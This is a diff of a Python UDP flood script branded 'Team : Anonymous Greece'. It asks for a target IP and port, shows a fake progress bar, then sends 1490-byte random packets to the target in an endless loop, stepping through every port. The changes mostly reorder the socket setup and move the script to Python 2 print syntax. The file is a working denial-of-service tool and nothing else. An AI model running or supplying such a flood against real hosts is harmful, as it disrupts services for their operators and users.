@@ -1,3 +1,4 @@
+print ("\033[91m")
 #!/usr/bin/env python2
 # -*- coding: utf-8 -*-
 import os
@@ -6,6 +7,19 @@ import time
 import socket
 import random
 from datetime import datetime
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
 
 # Color definitions
 red = "\033[91m"
@@ -46,27 +60,23 @@ port = input("Port       : ")
 os.system("clear")
 
 # Simulate loading
-print(yellow + "Starting attack..." + reset)
-print(green + "Team : Anonymous Greece\n" + reset)
-print("[                    ] 0% ")
-time.sleep(2)
-print("[=====               ] 25%")
-time.sleep(2)
-print("[==========          ] 50%")
-time.sleep(2)
-print("[===============     ] 75%")
-time.sleep(2)
-print("[====================] 100%")
-time.sleep(1)
-
-# Attack loop
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
+print("Team : Anonymous Greece")
+print ("\033[92m")
+print "[                    ] 0% "
+time.sleep(5)
+print "[=====               ] 25%"
+time.sleep(5)
+print "[==========          ] 50%"
+time.sleep(5)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[====================] 100%"
+time.sleep(3)
 sent = 0
 while True:
-    sock.sendto(bytes, (ip, port))
-    sent += 1
-    port += 1
-    print(f"{cyan}Sent {sent} packet to {ip} through port: {port}{reset}")
-    if port == 65534:
-        port = 1
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
